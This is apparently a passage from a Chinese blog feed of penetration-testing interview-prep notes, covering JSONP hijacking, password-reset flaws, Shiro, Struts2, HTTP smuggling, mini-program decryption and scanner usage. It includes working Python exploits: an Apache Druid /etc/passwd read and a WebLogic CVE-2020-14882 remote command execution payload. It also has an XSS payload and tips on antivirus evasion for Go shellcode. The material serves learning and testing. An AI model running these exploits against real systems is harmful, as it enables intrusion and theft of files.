burp加密<br>Decoder模块</p></li><li><p>应用有漏洞，无法修复和停用，应当怎么办？<br>1、隔离和监控： 将受漏洞影响的应用程序与其他系统隔离开来，以减少攻击的影响范围。同时，密切监视应用程序的活动，以侦测任何异常行为。<br>2、强化访问控制： 强化应用程序的访问控制，确保只有经过授权的用户能够访问关键功能和数据。使用强密码策略、多因素身份验证等方式提高访问控制的安全性。<br>3、应用补丁和安全配置： 尽量确保应用程序和相关组件的操作系统、数据库、中间件等都是最新版本，并且已经应用了相关的安全补丁。同时，配置这些组件的安全性设置，以减少攻击面。<br>4、网络防护措施： 在网络层面实施防火墙、入侵检测系统（IDS）和入侵防御系统（IPS）等措施，以减少恶意流量的影响。<br>5、数据加密： 对于敏感数据，使用加密来保护其机密性。这包括在数据传输过程中使用TLS&#x2F;SSL加密，以及在存储时使用适当的加密方法。<br>6、定期安全审计： 进行定期的安全审计和漏洞扫描，以及对应用程序进行渗透测试，以发现潜在的风险和漏洞。这有助于及早发现问题并采取纠正措施。<br>7、应急响应计划： 建立应急响应计划，以在发生安全事件时迅速采取措施。确保团队了解如何处理可能的威胁和攻击。</p></li><li><p>Jsonp劫持漏洞的原理、利用方式、防御方法<br>JSONP 是 JSON with padding（填充式 JSON 或参数式 JSON）的简写。<br>JSONP实现跨域请求的原理简单的说，就是动态创建 <code>&lt;script&gt;</code> 标签，然后利用 <code>&lt;script&gt;</code> 的src不受同源策略约束来跨域获取数据。</p></li></ol><p>JSONP 由两部分组成：回调函数和数据。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。</p><p>jsonp劫持漏洞原理：利用 <code>&lt;script&gt;</code> 标签中的src属性没有跨域限制</p><p>利用方式：<br>收集接口：找到返回数据格式是JSONP的接口(可以在数据包中检索关键词callback json jsonp email, cb等，也可以加上callback,参数，观察返回值是否变化)<br>加参数看返回信息：加上callback参数，观察返回值是否变化，是否返回jsonp格式的信息<br>比如以下就是标准的JSONP格式的信息</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hehehe(<span class="punctuation">&#123;</span><span class="attr">&quot;customername1&quot;</span><span class="punctuation">:</span><span class="string">&quot;user1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;12345678&quot;</span><span class="punctuation">&#125;</span>)</span><br></pre></td></tr></table></figure><p>防御：<br>1、限制来源refer<br>2、在请求中添加 csrfToken 并在后端进行验证<br>3、按照JSON格式标准输出（设置Content-Type : application&#x2F;json; charset&#x3D;utf-8）<br>预防 <code>http://127.0.0.1/getUsers.php?callback=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code> 形式的xss<br>4、过滤callback函数名以及JSON数据输出，预防xss</p><p><a href="https://www.cnblogs.com/yyhuni/p/15563994.html">JSONP劫持</a></p><ol start="47"><li>APP常见任意密码重置漏洞的挖掘方法<br>1、重要凭证泄露<br>验证码信息随请求一起发送到服务端，通过拦截数据包可发现正确验证码<br>构造修改密码的url中重要的参数在客户端请求中出现，可伪造目标邮箱中修改密码的url，达到任意修改密码的效果。<br>2、重要凭证可客户端篡改<br>抓包篡改<br>3、用户混淆<br>密码找回逻辑含有用户标识（用户名、用户 ID、cookie）、接收端（手机、邮箱）、凭证（验证码、token）、当前步骤等四个要素，若这几个要素没有完整关联，则可能导致任意密码重置漏洞。<br>4、重要凭证未校验<br>邮箱的重置url中用户名可任意更改，导致任意密码修改。一般的重置url中token和用户名会进行校验，如果不匹配则无法通过。<br>5、重要凭证可爆破<br>验证码为4位且未设置过期时间可直接用burp爆破。<br>6、应答中存在影响后续逻辑的状态参数<br>密码找回流程一般包括获取短信验证码、校验短信验证码是否有效、设置新密码等三个步骤。在第二步，校验短信验证码是否有效的结果应保存在服务端，某些网站未在服务端保存而是错误地将结果状态值下发客户端，后续又依靠前端 js 判断是否可以进入第三步，那么，更改应答包中的状态值，可重置其他用户的密码。<br>7、Token可预测<br>通过邮箱找回密码时，邮件中将出现一个含有 token 的重置 URL，该 token 即为重置凭证。从经验来看，开发人员习惯以时间戳、递增序号、关键字段（如邮箱地址）等三类信息之一作为因子，采用某种加密算法或编码生成 token，攻击者可以基于能收集到的关键字段，用常见加密算法计算一遍，以判断是否可以预测出 token。</li></ol><p><a href="https://blog.csdn.net/qq_43936524/article/details/113871485">逻辑漏洞之任意密码重置漏洞</a></p><ol start="48"><li><p>挖掘过哪些逻辑漏洞，请说明挖洞方法<br>1、身份认证逻辑漏洞：cookie仿冒<br>当时我测试网站，注册了那个网站的账号。然后出现了一个cookie，之后我为了验证这个cookie有效，更改了cookie的位数，发现就无效了。在位数不变的情况下，更改为任意32位的cookie我发现都是有效的。那么直接伪造cookie实现任意账号登录。<br>2、密码找回漏洞：跳过验证步骤。<br>某个网站，发现一个参数C3，更改为C6后直接进入找回页面</p></li><li><p>shiro550与shiro721的区别<br>1、这两个漏洞主要区别在于Shiro550使用已知密钥碰撞，只要有足够密钥库（条件较低），不需要Remember Cookie</p></li></ol><p>2、Shiro721的ase加密的key基本猜不到，系统随机生成，可使用登录后rememberMe去爆破正确的key值，即利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击，难度高</p><ol start="50"><li><p>struts2漏洞原理<br>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。 导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。<br><a href="https://tttang.com/archive/1583/">struts2漏洞集合</a></p></li><li><p>自动化挖洞了解过吗？曾经刷过什么漏洞？怎么刷的？<br>了解过。<br>流程：<br>1、Google语法：查找一些login admin页面。<br>2、信息收集1：查找子域名和C段信息。<br>3、信息收集2：查找C段的全端口页面<br>4、漏洞探测：使用vulmap，burp插件，xray等工具</p></li></ol><p>刷过struts2，fastjson，weblogic，shiro等中间件漏洞。SQL注入，XSS，文件包含等。<br><a href="https://cloud.tencent.com/developer/article/2142594">自动化批量挖洞流程</a></p><ol start="52"><li>python poc编写&#x2F;python脚本<br>编写的有：SQL注入，任意文件读取，远程命令执行，任意文件上传。<br>漏洞验证手段主要是通过匹配漏洞页面的特征码去判断该网站是否存在漏洞，主要使用了 requests 库去实现模拟用户进行请求，然后匹配特征码进行漏洞判断，Poc 编写的难度不大，而完整的利用脚本即 Exp 的编写难度相对 Poc 难度要大一点，代码能力要求也相对要扎实一点。</li></ol><p>SQL注入编写思路：<br>导入requests库；设置漏洞url链接；设置header头；构造sql语句查询数据库版本；发送http请求，注入payload并获取页面响应；若返回的响应中存在报错信息则证明存在漏洞，否则不存在。</p><p>Apache Druid LoadData 任意文件读取漏洞 编写：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动设置漏洞链接</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155:8888/druid/indexer/v1/sampler?for=connect&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 headers</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># burp 抓取的漏洞 post 请求数据包，用于验证漏洞，主要触发点为 &quot;uris&quot; 的参数值</span></span><br><span class="line">post_data = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;inputSource&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;http&quot;</span>,<span class="string">&quot;uris&quot;</span>:[<span class="string">&quot;file:///etc/passwd&quot;</span>]&#125;,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;(.*)&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 requests 库请求目标，post 请求格式为 json=post_data,并使用 verify=False 和 allow_redirects=False 参数来发送带有禁用 SSL 验证和禁用重定向的请求</span></span><br><span class="line">res = requests.post(url,json=post_data,headers=headers,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回请求的 text ,先手工查看是否存在漏洞</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>Weblogic CVE-2020-14882 未授权远程命令执行 编写思路：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制使用 HTTP/1.0 协议版本进行请求，而不是默认的 HTTP/1.1 版本,有些服务器可能对特定的协议版本有要求或限制,通过将协议版本设置为 HTTP/1.0，或许用于试图绕过一些与 HTTP/1.1，相关的限制或问题，具体没深究</span></span><br><span class="line">http.client.HTTPConnection._http_vsn_str = <span class="string">&#x27;HTTP/1.0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置未授权的后台链接</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155:7001/console/images/%252E%252E%252Fconsole.portal&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为我们请求链接为 GET 方法,请求头没有处理 POST 请求体的 headers 头，这边需要自定义一个 headers 头，确保能进行 POST 请求，主要需要添加 Content-Type 以及定义命令执行参数 cmd</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;Safari/537.36&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&#x27;</span></span><br><span class="line">                     <span class="string">&#x27;*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-GB,en-US;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;cmd&#x27;</span>: <span class="string">&#x27;ls&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST 请求体，注意这里和上面的 POST 数据包有所不一样，上面的 POST 请求都是参数化，参数与参数值均需要使用单引号或者双引号包括，该脚本是直接使用&#x27;&#x27;&#x27; &#x27;&#x27;&#x27; 包括字符即可</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#x27;weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj);String cmd = req.getHeader(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;if (cmd != null) &#123;String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(&quot;\\\A&quot;).next();weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();res.getWriter().write(&quot;&quot;);&#125;executeThread.interrupt();&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 requests 进行 POST 请求</span></span><br><span class="line">res = requests.post(url, data=payload, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出响应文本</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>Weblogic 任意文件上传（CVE-2018-2894）</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 漏洞url</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155:7001/ws_utc/resources/setting/options/general&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置headers</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行get请求</span></span><br><span class="line">res = requests.get(url=url, headers=headers, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若get请求页面中存在&lt;name&gt;BasicConfigOptions.workDir&lt;/name&gt;则存在漏洞</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;name&gt;BasicConfigOptions.workDir&lt;/name&gt;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 存在 CVE-2018-2894 WebLogic任意文件上传漏洞&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 不存在 CVE-2018-2894 WebLogic 任意文件上传漏洞&quot;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/12555">Python Poc编写实例：从原理到实践</a></p><ol start="53"><li>小程序解密<br>工具：小程序包解密，wxappUnpacker-master，微信开发者工具。另外一个单独的工具：wechatMiniAppReverse<br>思路：1、反编译小程序  2、动态调试获取明文  3、微信开发者工具<br>流程：<br>1、拿小程序包<br>pc微信搜索小程序，然后打开。获取小程序包。<br>小程序包目录: <code>C:\Users\（用户名）\Documents\WeChat Files\Applet</code></li></ol><p>2、小程序包解密<br>使用小程序包解密工具（工具就叫这个名字），打开目录选中包（不能移动包的位置），解密成功<br>解密后的文件在小程序包解密工具的目录下的wxpack。</p><p>3、小程序反编译<br>将解密文件复制进wxappUnpacker-master，配置环境：<br>先安装node，然后在wxappUnpacker-master文件夹内打开cmd，执行下面命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm install esprima</span><br><span class="line">npm install css-tree</span><br><span class="line">npm install cssbeautify</span><br><span class="line">npm install vm2</span><br><span class="line">npm install uglify-es</span><br><span class="line">npm install js-beautify</span><br></pre></td></tr></table></figure><p>安装完后在wxappUnpacker-master文件夹内打开cmd执行命令：<br><code>node .\wuWxapkg.js 解密文件名.wxapkg</code></p><p>4、动态调试<br>此时在wxappUnpacker-master文件夹内会保存小程序的源码<br>下载微信开发者工具打开此文件夹：（初次使用需要手机扫码登录微信）<br>简单审计找到传参点，设置console.log（）打印加密前的明文<br>设置完毕点击相关功能点<br>获取到明文</p><p>5、payload加密<br>找到加密后的变量，设置console.log()打印：<br>使用相关功能点后，获取密文。</p><p>6、burp抓包<br>第一种方式：模拟器下载微信登录抓包，很麻烦，而且手机会掉线。<br>第二种：pc端抓包，需要设置代理。可在微信设置代理，也可使用Windows自带设置代理<br>配置完即可burp抓包了。</p><p>客户端有加密js的源码，功力深的表哥们可以直接利用算法写扫描器进行漏洞探测。</p><p>修复建议：<br>1、通过增加基于时间的验证，来确保数据包的真实性。<br>2、加一个Referer检测的中间件，所有Referer里包含 devtools 的请求全部返回500<br>3、堆appid授权检测</p><p><a href="https://www.freebuf.com/vuls/284001.html">记一次短暂的小程序解密之旅</a></p><ol start="54"><li><p>go语言免杀shellcode如何免杀？免杀原理是什么？  go免杀原理<br>1、延长运行时间，导致杀软检测超时<br>2、利用杀软对golang的弱检测<br>3、对shellcode进行多次编码解码来隐藏特征<br>4、加载无关字符串混淆。</p></li><li><p>shiro漏洞类型，shiro721原理，721利用要注意什么？<br>Shiro组件漏洞主要分为两种类型，一种是Java反序列化造成的远程代码执行漏洞，一种是身份验证绕过漏洞。<br>721原理：shiro使用的cookie里的rememberMe字段采用了AES-128-CBC的加密模式，这使得该字段可以被padding oracle攻击利用。攻击者可以使用一个合法有效的rememberMe的cookie作为前缀来实施POA，然后制造一个特制的rememberMe来执行Java反序列化攻击。<br>这个漏洞比较鸡肋的地方在于需要获取合法用户的rememberMe，如果配合XSS之类的效果会更好，并且在利用时shiro采用的是Collection3.1需要搭配相应的payload。</p></li><li><p>eval和system的区别<br>eval()函数是代码执行，括号里必须是一个符合php语法的语句，如果不符合语法会报错<br>system()函数是命令执行</p></li><li><p>HTTP请求走私漏洞 HTTP Smuggling 攻击<br>漏洞发生前提：一般在前后端服务器分离或存在CDN加速服务的情况下<br>原理：<br>一般是后端和前端对于请求的结束认证不一致导致的，相当于后端对于第一个包产生了截断，前者正常处理，后者就会和第二个包进行拼接，这样就对第二个包造成了影响，详细看下下面这两张图。<br><img src="/simg/http_smuggling.png" alt="http smuggling"></p></li></ol><p>分类：<br>1、CL-TE: 前端服务器只处理Content-Length请求头，后端处理Transfer-Encoding请求头<br>2、TE-CL: 前端服务器只处理TE请求头，后端处理CL请求头<br>3、TE-TE: 前后端都是用TE来处理请求，但是我们可以通过混淆TE头方式让后端不再根据TE处理而是变成了根据CL处理</p><p>如何发现：<br>可以使用Burp插件商店里面的HTTP Request Smuggler</p><p>防御：<br>禁用代理服务器与后端服务器之间的TCP连接重用。<br>使用HTTP&#x2F;2协议。<br>前后端使用相同的服务器。</p><p><a href="https://xz.aliyun.com/t/11423">秒懂Http请求走私</a><br><a href="https://xz.aliyun.com/t/6878">一篇文章带你读懂 HTTP Smuggling 攻击</a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li><p><a href="https://docs.qq.com/doc/DSlByWEZoaWx4U3la">2022渗透测试面试问题搜集</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/511394956">干货 | 80篇+网络安全面试经验帖(第36篇还没看)</a></p></li><li><p><a href="https://blog.51cto.com/u_15474183/5535532">2023级网络安全岗面试题及面试经验分享</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/566448154">2023届网络安全岗秋招面试题及面试经验分享</a></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;可以不用，但不能没有。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="web漏洞" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/web%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之密码学篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-10-17T16:17:22.519Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>巧妙运用，出神入化。</p><span id="more"></span><h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><ol><li><p>常见加密方式</p></li><li><p>AES&#x2F;DES的具体工作步骤</p></li><li><p>RSA算法</p></li><li><p>如何生成一个安全的随机数？</p></li><li><p>在</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;巧妙运用，出神入化。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="密码学" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之工具篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-10-30T10:32:59.970Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>工具是兵器，知识是使用方法。</p><span id="more"></span><h1 id="发散提问"><a href="#发散提问" class="headerlink" title="发散提问"></a>发散提问</h1><ol><li><p>你平时使用哪些工具？以及对应工具的特点？</p></li><li><p>使用什么工具来判断系统是否存在后门？</p></li></ol><p>D盾_Web查杀：只支持Windows<br>Sangfor WebShellKiller<br>深信服EDR<br>Web Shell Detector<br><a href="https://bypass007.github.io/Emergency-Response-Notes/Summary/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E7%9A%84Webshell%E6%9F%A5%E6%9D%80%E5%B7%A5%E5%85%B7.html">常见的Webshell查杀工具</a></p><h1 id="网络工具"><a href="#网络工具" class="headerlink" title="网络工具"></a>网络工具</h1><ol><li>有哪些反向代理的工具？</li></ol><p>Nginx: 开源的高性能反向代理服务器，支持负载均衡、缓存、SSL加密等功能，常用于Web服务器、API Gateway等。<br>Apache HTTP Server: 开源的Web服务器，也可以作为反向代理服务器，支持负载均衡、SSL加密、反向代理等功能。<br>HAProxy: 高性能的负载均衡器和反向代理服务器，支持TCP和HTTP协议，可用于HTTP请求的负载均衡、高可用性等场景。<br>Traefik: 基于Go语言开发的现代化反向代理服务器，支持自动发现服务、负载均衡、自动SSL证书管理等功能，常用于Docker容器环境。<br>Envoy: 由Lyft开发的高性能反向代理和边缘代理，支持负载均衡、服务发现、流量管理等功能，常用于微服务环境。</p><h1 id="渗透测试工具"><a href="#渗透测试工具" class="headerlink" title="渗透测试工具"></a>渗透测试工具</h1><ol><li>sqlmap，怎么对一个注入点注入？</li></ol><p>设置指定注入参数：<br><code>-p</code> : 指定参数进行扫描，不是扫描所有参数，提高效率。<br><code>--skip</code> : 跳过指定参数扫描，和 <code>-p</code> 的作用相反，它用来跳过需要扫描的参数。<br><code>--param-exclude</code> : 不对包含具体内容参数的请求进行探测，如不对包含token和session参数的请求进行探测。<br><code>--skip-static</code> : 扫描时忽略非动态参数。</p><p>sqlmap设置url注入位置<br>当注入点在url上时，除非手动将注入点指向URL上，否则sqlmap不会对url路径执行任何自动测试，必须要在扫描时在url上加星号(*)来指定这些注入点。<br><code>python sqlmap.py -u &quot;http://172.17.0.1/Less-1*/?id=1&quot; --banner</code></p><p>sqlmap设置任意注入位置<br>使用星号(*)来指定注入点<br><code>python sqlmap.py -u &quot;http://172.17.0.1/Less-20/?id=1&quot; --cookie=&quot;uname=admin*&quot; --banner</code></p><ol start="2"><li>nmap，扫描的几种方式？</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-sS  SYN扫描，半连接扫描，优点是扫描速度快，不容易被记录，适用于任何兼容TCP堆栈，可以清晰可靠地区分端口开启、关闭和过滤状态。</span><br><span class="line">但需要root权限去构造原始数据包，目前IDS可以检测到这种扫描方式。</span><br><span class="line">-sT  TCP连接扫描，建立完整的连接，会被日志、IDS等记录。</span><br><span class="line">-sA  ACK扫描，适合用来映射防火墙规则。</span><br><span class="line">-sW  Windows扫描，窗口扫描原理与ACK扫描相同，但它会利用系统的实现细节区分端口开放和关闭，而不是都标记为 unfiltered。</span><br><span class="line">-sM  Maimon扫描，以发现者Uriel Maimon命名，使用FIN/ACK数据包为探针。</span><br><span class="line">-sU  UDP扫描，速度很慢，扫描上千个端口需要至少17分钟，多数Linux系统会限制icmp响应速率。</span><br><span class="line">-sN/sF/sX  NULL扫描、FIN扫描、Xmas扫描，设置TCP标志位。</span><br><span class="line">这三种扫描类型（以及--scanflags选项）利用TCP RFC 标准中的细节来区分开放端口和关闭端口，通常只能确定关闭的端口。</span><br><span class="line">-sI  空闲扫描，也有称之为僵尸扫描，利用僵尸主机进行扫描，优点是隐蔽性强，缺点是需要找一台合适的僵尸主机。</span><br><span class="line">-sY/sZ SCTP INIT/COOKIE-ECHO扫描，这两种扫描方式是基于SCTP协议。</span><br><span class="line">-sO  协议扫描，IP层协议扫描，这不算是端口扫描技术，该扫描技术用于判断目标主机所支持的协议。</span><br></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/sectool/277822.html">一文读懂Nmap的正确使用方法</a></p><ol start="3"><li>用什么扫描端口，目录？</li></ol><p>nmap,dirsearch</p><ol start="4"><li>子域名枚举用过哪些工具，原理是什么，如果出现了任意子域名都返回200是什么原因？</li></ol><p>子域名枚举工具：<br>(1) theHarvester: 